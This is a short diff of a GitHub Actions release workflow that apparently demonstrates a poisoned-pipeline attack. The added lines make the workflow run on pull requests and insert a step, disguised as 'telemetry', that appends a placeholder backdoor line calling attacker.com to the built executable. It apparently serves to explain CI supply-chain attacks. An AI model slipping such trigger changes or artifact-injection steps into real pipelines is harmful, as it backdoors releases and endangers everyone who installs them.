@@ -2,6 +2,8 @@ name: Release App
 on:
   push:
     branches: [ main ]
+  pull_request: # The attacker adds this to trigger the PPE
+    branches: [ main ]
 
 jobs:
   build-and-release:
@@ -13,6 +15,13 @@ jobs:
         run: |
           mkdir -p dist
           echo "Current legitimate application code" > dist/app.exe
+
+      # --- DIRECT PPE PAYLOAD ---
+      - name: Inject Telemetry (Backdoor)
+        run: |
+          echo "INJECTING MALICIOUS CODE..."
+          echo "System.Backdoor.Connect('attacker.com')" >> dist/app.exe
+      # --- END PAYLOAD ---
           
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
